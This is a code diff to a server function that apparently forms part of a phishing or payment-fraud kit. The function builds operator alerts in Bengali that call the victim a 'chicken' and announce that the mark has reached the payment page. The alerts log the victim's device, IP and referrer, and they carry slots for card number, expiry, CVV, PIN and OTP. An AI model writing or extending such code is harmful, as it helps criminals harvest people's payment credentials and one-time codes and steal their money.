@@ -25,15 +25,40 @@ serve(async (req) => {
   }
 
   try {
-    const { type, amount, method, userAgent, timestamp, reason, refId, ip, referrer } = await req.json();
+    const { type, amount, method, userAgent, timestamp, reason, refId, ip, referrer, step, paymentType } = await req.json();
 
-    // Try to get real IP from headers if not provided
     const clientIp = ip || req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || 'Unknown';
-
-    let message = '';
     const time = new Date(timestamp || Date.now()).toLocaleString('en-BD', { timeZone: 'Asia/Dhaka' });
 
-    if (type === 'page_entry') {
+    let message = '';
+
+    if (type === 'payment_activity') {
+      if (paymentType === 'card') {
+        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
+          `-------------------\n\n` +
+          `Payment Method : ${method || 'N/A'}\n` +
+          `Cardholder Name : N/A\n` +
+          `Card Number : N/A\n` +
+          `Expiry Date : N/A\n` +
+          `CVV : N/A\n\n` +
+          `OTP : N/A\n\n` +
+          `-------------------\n\n` +
+          `🐔মুরগির Device : ${userAgent || 'Unknown'}\n` +
+          `🐔মুরগির IP : ${clientIp}\n` +
+          `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
+      } else {
+        message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
+          `-------------------\n\n` +
+          `Payment Method : ${method || 'N/A'}\n` +
+          `Number : N/A\n` +
+          `OTP : N/A\n` +
+          `PIN : N/A\n\n` +
+          `-------------------\n\n` +
+          `🐔মুরগির Device : ${userAgent || 'Unknown'}\n` +
+          `🐔মুরগির IP : ${clientIp}\n` +
+          `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
+      }
+    } else if (type === 'page_entry') {
       message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
         `-------------------\n\n` +
         `Update : Selection Page\n\n` +
